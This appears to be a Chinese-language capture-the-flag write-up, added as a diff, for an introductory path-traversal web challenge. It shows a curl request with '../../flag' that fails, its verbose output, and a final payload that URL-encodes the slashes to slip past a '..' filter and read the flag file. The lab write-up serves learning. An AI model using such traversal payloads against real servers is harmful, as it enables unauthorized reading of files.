@@ -1,0 +1,50 @@
+#哇塞，web安全第一道题就对我弱小的心灵来了一次极大的震撼，我是没一点web安全经验的，做这道入门题花的时间总计有6个小时之久，我是真升华了。接下来看我给你娓娓道来。
+This level will explore the intersection of Linux path resolution, when done naively, and unexpected web requests from an attacker. We've implemented a simple web server for you --- it will serve up files from /challenge/files over HTTP. Can you trick it into giving you the flag?
+
+The webserver program is . You can run it just like any other challenge, then talk to it over HTTP (using a different terminal or a web browser). We recommend reading through its code to understand what it is doing and to find the weakness!/challenge/server
+
+HINT: If you're wondering why your solution isn't working, make sure what you're trying to query is what is actually being received by the server! can show you the exact bytes that curl is sending over.curl -v [url]
+
+//题目简介，总而言之，你输入/challenge/server启动服务器，再启动另一台终端，开始你的challenge。
+
+//另一台bash：
+//首先，你要找到flag文件位置
+ls -la /challenge/files  -> index.html
+ls -la /challenge/files/.. -> DESCRIPTION.md  files  server //继续
+ls -la /challenge/files/../.. -> 可得flag文件位置，../../
+
+#开始爬取
+curl -v(具体信息)  "http://challenge.localhost/../../flag" 
+#反应:
+hacker@web-security~path-traversal-1:~$ curl -v "http://challenge.localhost/../../flag"
+* Host challenge.localhost:80 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:80...
+* connect to ::1 port 80 from ::1 port 36862 failed: Connection refused
+*   Trying 127.0.0.1:80...
+* Connected to challenge.localhost (127.0.0.1) port 80
+> GET /flag HTTP/1.1
+> Host: challenge.localhost
+> User-Agent: curl/8.7.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 404 NOT FOUND
+< Server: Werkzeug/3.0.4 Python/3.8.10
+< Date: Mon, 16 Sep 2024 10:59:44 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 139
+< Connection: close
+< 
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>No /challenge/files/flag from directory /home/hacker</p>
+* Closing connection
+
+#原因就是，'..'字段已被列入黑名单，你需要对'..'进行加密，也就是encode
+curl -v "http://challenge.localhost/..%2F..%2F/flag" //这便是题解了
+
+//真的摸索了好久，从方向错误到一步步抓到蛛丝马迹，终于也是解出来了
